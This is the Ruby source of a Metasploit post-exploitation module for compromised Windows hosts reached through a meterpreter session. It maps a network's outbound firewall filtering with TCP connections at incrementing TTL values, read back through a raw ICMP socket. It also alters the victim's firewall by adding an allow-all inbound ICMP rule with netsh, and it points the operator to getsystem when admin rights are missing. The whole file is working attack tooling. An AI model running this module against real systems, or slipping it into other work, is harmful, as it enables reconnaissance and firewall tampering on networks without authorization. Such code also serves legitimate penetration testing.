# -*- coding: binary -*-

##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Outbound-Filering Rules',
      'Description'   => %q{
        This module makes some kind of TCP traceroute to get outbound-filtering rules.
        It will try to make a TCP connection to a certain public IP address (this IP
        does not need to be under your control) using different TTL incremental values.
        This way if you get an answer (ICMP ttl time exceeded packet) from a public IP
        device you can infer that the destination port is allowed. Setting STOP to
        true the module will stop as soon as you reach a public IP (this will generate
        less noise in the network).
      },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'Borja Merino <bmerinofe[at]gmail.com>' ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'References'   => [
        [ 'URL', 'http://www.shelliscoming.com/2014/11/getting-outbound-filtering-rules-by.html' ]
      ]
    ))

    register_options(
      [
        OptAddress.new("ADDRESS" , [ true, 'Destination IP address.']),
        OptInt.new('HOPS', [true, 'Number of hops to get.', 3]),
        OptInt.new('MIN_TTL', [true, 'Starting TTL value.', 1]),
        OptString.new('PORTS', [true, 'Ports to test (e.g. 80,443,100-110).','80,443']),
        OptInt.new('TIMEOUT', [true, 'Timeout for the ICMP socket.', 3]),
        OptBool.new('STOP', [true, 'Stop when it finds a public IP.', false])
      ], self.class)
  end

  def icmp_setup
    handler = client.railgun.ws2_32.socket("AF_INET", "SOCK_RAW", "IPPROTO_ICMP")
    if handler['GetLastError'] != 0
      print_error("There was an error setting the ICMP raw socket; GetLastError: #{handler['GetLastError']}")
      return nil
    end
    vprint_status("ICMP raw socket created successfully")

    r = client.railgun.ws2_32.bind(handler['return'],"\x02\x00\x00\x00" << Rex::Socket.addr_aton(session.session_host) << "\x00"*8 ,16)
    if r['GetLastError'] != 0
      print_error("There was an error binding the ICMP socket to #{session.session_host}; GetLastError: #{r['GetLastError']}")
      return nil
    end
    vprint_status("ICMP socket successfully bound to #{session.session_host}")

    # int WSAIoctl(
    # _In_   SOCKET s,
    # _In_   DWORD dwIoControlCode,
    # _In_   LPVOID lpvInBuffer,
    # _In_   DWORD cbInBuffer,
    # _Out_  LPVOID lpvOutBuffer,
    # _In_   DWORD cbOutBuffer,
    # _Out_  LPDWORD lpcbBytesReturned,
    # _In_   LPWSAOVERLAPPED lpOverlapped,
    # _In_   LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
    # );

    sio_rcvall = 0x98000001
    r = client.railgun.ws2_32.WSAIoctl(handler['return'],sio_rcvall,"\x01",4,nil,0,4,nil,nil)
    if r['GetLastError'] != 0
      print_error("There was an error calling WSAIoctl (ICMP raw socket); GetLastError: #{r['GetLastError']}")
      return nil
    end
    return handler['return']
  end

  def tcp_setup(ttl)
    handler = client.railgun.ws2_32.socket("AF_INET", "SOCK_STREAM", "IPPROTO_TCP")
    if handler['GetLastError'] != 0
      print_error("There was an error setting the TCP socket; GetLastError: #{handler['GetLastError']}")
      return nil
    end
    vprint_status("TCP socket created successfully")

    # 0x8004667E = FIONBIO
    # Enable non-blocking mode when *argp (third parameter in ioctlsocket) is set to a nonzero value

    cmd = 0x8004667E
    r = client.railgun.ws2_32.ioctlsocket(handler['return'], cmd, 1)
    if r['GetLastError'] != 0
      print_error("There was an error setting the TCP socket in non-blocking mode; GetLastError: #{r['GetLastError']}")
      return nil
    end
    vprint_status("TCP socket successfully configured in non-blocking mode")

    # int setsockopt(
    # _In_  SOCKET s,
    # _In_  int level,
    # _In_  int optname,
    # _In_  const char *optval,
    #_In_  int optlen
    # );

    ipproto_ip = 0
    ip_ttl = 4
    r = client.railgun.ws2_32.setsockopt(handler['return'], ipproto_ip, ip_ttl, [ttl].pack('C'), 4)
    if r['GetLastError'] != 0
      print_error("There was an error setting the TTL value; GetLastError: #{r['GetLastError']}")
      return nil
    end
    vprint_status("TTL value successfully set to #{ttl}")
    return handler['return']
  end

  def connections(remote, dst_port, h_icmp, h_tcp, to)
    r = client.railgun.ws2_32.connect(h_tcp, "\x02\x00" << [dst_port].pack("n") << Rex::Socket.addr_aton(remote) << "\x00"*8 , 16)

    # A GetLastError == 1035 is expected since the socket is set to non-blocking mode
    if r['GetLastError'] != 10035
      print_error("There was an error creating the connection to the peer #{remote}; GetLastError: #{r['GetLastError']}")
      return
    end

    from = " " * 16

    begin
      ::Timeout.timeout(to) do
        r = client.railgun.ws2_32.recvfrom(h_icmp, "\x00" * 100, 100, 0, from, 16)
        hop = Rex::Socket.addr_ntoa(r['from'][4..7])
        return hop
      end
    rescue ::Timeout::Error
      return nil
    end

  end

  def run
    unless is_admin?
      print_error("You don't have enough privileges. Try getsystem.")
      return
    end

    if sysinfo['OS'] =~ /XP/
      print_error('Windows XP is not supported')
      return
    end

    output = cmd_exec('netsh',' advfirewall firewall add rule name="All ICMP v4" dir=in action=allow protocol=icmpv4:any,any')
    print_status("ICMP firewall IN rule established: #{output}")

    session.railgun.ws2_32
    remote = datastore['ADDRESS']
    to = datastore['TIMEOUT']

    ports = Rex::Socket.portspec_crack(datastore['PORTS'])

    ports.each do |dport|
      print_status("Testing port #{dport}...")
      0.upto(datastore['HOPS'] - 1) { |i|
        i = i + datastore['MIN_TTL']
        h_icmp = icmp_setup
        return if h_icmp.nil?
        h_tcp = tcp_setup(i)
        return if h_tcp .nil?

        hop = connections(remote, dport, h_icmp, h_tcp, to)
        if hop != nil
          print_good("#{i} #{hop}")
          if datastore['STOP'] == true and !Rex::Socket.is_internal?(hop)
            print_good("Public IP reached. The port #{dport} is not filtered")
            break
          end
        else
          print_error("#{i} *")
        end

        client.railgun.ws2_32.closesocket(h_tcp)
        client.railgun.ws2_32.closesocket(h_icmp)
       }
    end
  end
end
